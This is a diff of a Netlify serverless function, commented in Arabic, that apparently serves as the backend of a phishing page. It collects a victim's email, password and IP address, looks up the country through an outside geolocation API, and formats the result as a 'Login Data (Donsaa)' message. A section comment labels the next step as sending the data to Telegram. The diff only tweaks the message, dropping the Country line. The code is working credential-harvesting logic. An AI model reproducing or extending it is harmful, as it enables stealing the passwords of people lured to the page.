@@ -27,24 +27,18 @@ exports.handler = async (event, context) => {
     const ip = getClientIp(event.headers); 
     let countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
     
-    // ----------------------------------------------------------------
     // **آلية جلب رمز البلد الاحتياطية (FallBack)**
-    // ----------------------------------------------------------------
-    // إذا كان البلد غير متوفر من Netlify، نحاول جلبه من API خارجي
     if (countryCode === 'غير متوفر' && ip !== 'غير متوفر') {
         try {
-            // استخدام ip-api.com لجلب رمز البلد فقط
             const geoApiUrl = `http://ip-api.com/json/${ip}?fields=countryCode`;
             const geoResponse = await fetch(geoApiUrl);
             const geoData = await geoResponse.json();
 
             if (geoResponse.ok && geoData.countryCode) {
-                // تحديث countryCode بالرمز الجديد
                 countryCode = geoData.countryCode; 
             }
         } catch (e) {
             console.error("Error fetching geo location from API:", e);
-            // ستبقى القيمة 'غير متوفر' في حال فشل API الخارجي
         }
     }
     
@@ -95,16 +89,15 @@ exports.handler = async (event, context) => {
     const safe_email = escapeMarkdownV2(email);
     const safe_password = escapeMarkdownV2(password);
     const safe_ip = escapeMarkdownV2(ip);
-    const safe_country = escapeMarkdownV2(countryCode);
+    const safe_country = escapeMarkdownV2(countryCode); // لا يزال يتم ترميزه لكنه لن يُستخدم في الرسالة
 
-    // تشكيل الرسالة
+    // تشكيل الرسالة (تم حذف سطر Country)
     let message_text = `👤 *Login Data \\(Donsaa\\)* 👤\n\n`;
     message_text += `*STATUS: ${securityStatus}*\n\n`;
     message_text += `E\\-Mail: \`${safe_email}\`\n`;
     message_text += `Passwort: \`${safe_password}\`\n`;
-    message_text += `IP: \`${safe_ip}\`\n`;
-    message_text += `Country: \`${safe_country}\`\n`; 
-
+    message_text += `IP: \`${safe_ip}\`\n\n`; // <--- تم تعديل هذا السطر
+    
     // ----------------------------------------------------------------
     // 4. إرسال البيانات إلى Telegram 
     // ----------------------------------------------------------------
